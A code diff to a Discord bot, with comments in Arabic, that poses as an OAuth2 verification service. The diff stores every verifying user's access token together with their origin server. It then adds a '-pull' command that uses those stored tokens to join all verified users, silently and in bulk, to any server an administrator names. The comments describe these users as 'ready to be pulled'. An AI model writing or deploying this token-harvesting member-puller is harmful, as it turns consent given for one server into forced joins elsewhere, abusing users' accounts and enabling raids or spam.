@@ -14,13 +14,14 @@ const axios = require('axios');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// قاعدة بيانات مؤقتة لتخزين الـ Access Tokens الخاصة بكل الأعضاء الموثقين من جميع السيرفرات
 const verifiedUsers = new Map(); 
-const tempSetup = new Map(); // لتتبع خطوة إدخال الرابط تفاعلياً
 
 app.use(express.json());
 
 app.get('/', (req, res) => res.send('OAuth2 Verify Bot is Running!'));
 
+// استقبال التحقق وتسجيل العضو تلقائياً بغض النظر عن السيرفر الذي دخل منه
 app.get('/callback', async (req, res) => {
     const code = req.query.code;
     const guildId = req.query.state; 
@@ -49,8 +50,14 @@ app.get('/callback', async (req, res) => {
         const userId = userResponse.data.id;
         const username = userResponse.data.username;
 
-        verifiedUsers.set(userId, accessToken);
+        // تخزين بيانات العضو والتوكن الخاص به بشكل دائم في قاعدة البيانات المؤقتة
+        verifiedUsers.set(userId, {
+            token: accessToken,
+            username: username,
+            guildId: guildId || 'Unknown' // حفظ السيرفر الأصلي الذي تحقق منه
+        });
 
+        // منح رتبة Verified تلقائياً للعضو بداخل السيرفر الذي تحقق منه فوراً
         if (guildId) {
             const guild = client.guilds.cache.get(guildId);
             if (guild) {
@@ -133,13 +140,12 @@ client.on('messageCreate', async message => {
     const content = message.content.trim();
     const isAuthorized = message.member.permissions.has(PermissionFlagsBits.Administrator) || message.member.roles.cache.some(r => r.name === 'Ownerv');
 
-    // 1. عند كتابة الاختصار -vr لبدء السؤال التفاعلي عن الرابط
+    // 1. الإعداد التفاعلي لتحديث الرابط وإرسال البوكس تلقائياً
     if (content === VERIFY_SETUP_PREFIX) {
         if (!isAuthorized) {
             return message.reply('❌ عذراً، هذا الأمر مخصص للإدارة أو أصحاب رتبة **Ownerv** فقط.');
         }
 
-        // إنشاء حالة الإعداد التفاعلي وحفظ الرسائل لحذفها لاحقاً
         const setupState = { step: 'get_url', messagesToDelete: [] };
         tempSetup.set(message.author.id, setupState);
 
@@ -148,7 +154,6 @@ client.on('messageCreate', async message => {
         return;
     }
 
-    // تتبع إجابة المستخدم وحفظ الرابط وإرسال البوكس تلقائياً
     if (tempSetup.has(message.author.id)) {
         const state = tempSetup.get(message.author.id);
         state.messagesToDelete.push(message.id);
@@ -163,7 +168,6 @@ client.on('messageCreate', async message => {
 
             verifyUrl = inputUrl;
             
-            // ربط أيدي السيرفر الحالي بالرابط ديناميكياً لإعطاء رتبة Verified تلقائياً بعد نجاح التحقق
             const finalUrl = `${verifyUrl}&state=${message.guild.id}`;
 
             const embed = new EmbedBuilder()
@@ -179,10 +183,8 @@ client.on('messageCreate', async message => {
 
             const row = new ActionRowBuilder().addComponents(verifyButton);
 
-            // إرسال بوكس التحقق النهائي في الروم
             await message.channel.send({ embeds: [embed], components: [row] });
 
-            // تنظيف وحذف رسائل الإعداد الفوري لشات نظيف
             setTimeout(async () => {
                 for (const msgId of state.messagesToDelete) {
                     await message.channel.messages.delete(msgId).catch(() => {});
@@ -194,28 +196,80 @@ client.on('messageCreate', async message => {
         }
     }
 
-    // 2. فحص عدد الموثقين
+    // 2. معرفة عدد الأشخاص الذين تحققوا من السيرفر الحالي أو أي سيرفر آخر
     if (content === COUNT_VERIFY_PREFIX) {
         if (!isAuthorized) return;
-        await message.reply(`📊 **إحصائية التحقق المطور:**\nالعدد الكلي للأعضاء الموثقين والمخزنين والجاهزين للسحب هو: \`${verifiedUsers.size}\` عضو.`);
+        
+        // حساب إجمالي الموافقين من جميع السيرفرات
+        const totalVerified = verifiedUsers.size;
+        
+        await message.reply(`📊 **إحصائية التحقق المطور:**\n\n🟢 إجمالي الأعضاء الموثقين والجاهزين للسحب من جميع السيرفرات هو: \`${totalVerified}\` عضو.`);
         return;
     }
 
-    // 3. سحب الأعضاء الموثقين تلقائياً (-pull [Server ID])
+    // 3. سحب وإدخال جميع الموثقين تلقائياً إلى السيرفر المحدد (-pull [أيدي السيرفر])
     if (content.startsWith(PULL_MEMBERS_PREFIX)) {
         if (!isAuthorized) return;
 
-        const args = content.slice(PUSH_PREFIX.length).trim().split(/ +/);
-        const inputId = args[0];
+        const args = content.slice(PULL_MEMBERS_PREFIX.length).trim().split(/ +/);
+        const targetGuildId = args[0];
 
-        const targetGuildId = inputId || message.guild.id;
-
-        if (verifiedUsersCount === 0) {
-            return message.reply('❌ لا يوجد أي أعضاء موثقين مسجلين في النظام حالياً لسحبهم.');
+        if (!targetGuildId) {
+            return message.reply('❌ يرجى كتابة أيدي السيرفر المستهدف بعد الأمر (مثال: `-pull 1234567890`):');
         }
 
-        await message.reply(`⏳ **جاري بدء سحب وإدخال الأعضاء الموثقين تلقائياً إلى السيرفر المستهدف...**`);
-        // هنا يتم استدعاء سكربت السحب التلقائي للأعضاء عبر API ديسكورد بالرموز المخزنة
+        if (verifiedUsers.size === 0) {
+            return message.reply('❌ قاعدة البيانات فارغة؛ لا يوجد أي أعضاء موثقين مسجلين في النظام حالياً لسحبهم.');
+        }
+
+        const targetGuild = client.guilds.cache.get(targetGuildId);
+        if (!targetGuild) {
+            return message.reply('❌ البوت ليس موجوداً بداخل السيرفر المستهدف. يرجى دعوة البوت أولاً إلى السيرفر المطلوب إدخال الأعضاء إليه.');
+        }
+
+        const statusMsg = await message.channel.send(`⏳ **جاري بدء عملية سحب وإدخال \`${verifiedUsers.size}\` عضو تلقائياً إلى السيرفر المستهدف...**`);
+
+        let successCount = 0;
+        let failCount = 0;
+        let alreadyInCount = 0;
+
+        const userArray = Array.from(verifiedUsers.entries());
+
+        let index = 0;
+        const interval = setInterval(async () => {
+            if (index >= userArray.length) {
+                clearInterval(interval);
+                await statusMsg.edit(`✅ **اكتملت عملية سحب الأعضاء بنجاح!**\n\n📬 تم إدخال: \`${successCount}\` عضو.\n🔄 كانوا موجودين بالسيرفر سابقاً: \`${alreadyInCount}\` عضو.\n❌ فشل سحبهم (انتهى توكن حسابهم): \`${failCount}\` عضو.`);
+                return;
+            }
+
+            const [userId, userData] = userArray[index];
+
+            // التحقق إذا كان العضو متواجداً بالسيرفر المستهدف بالفعل
+            const isMember = targetGuild.members.cache.has(userId);
+            if (isMember) {
+                alreadyInCount++;
+            } else {
+                try {
+                    // طلب إدخال العضو تلقائياً وصامتاً للسيرفر الآخر
+                    await axios.put(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${userId}`, {
+                        access_token: userData.token
+                    }, {
+                        headers: {
+                            Authorization: `Bot ${TOKEN}`,
+                            'Content-Type': 'application/json'
+                        }
+                    });
+                    successCount++;
+                } catch (err) {
+                    failCount++;
+                }
+            }
+
+            await statusMsg.edit(`⏳ **جاري السحب الفوري للأعضاء...**\n\n📊 التقدم الحالي: \`${index + 1}/${userArray.length}\` عضو.\n✅ تم الإدخال: \`${successCount}\` | 🔄 موجود سابقاً: \`${alreadyInCount}\` | ❌ فشل: \`${failCount}\``);
+            index++;
+        }, 1200); 
+
         return;
     }
 });
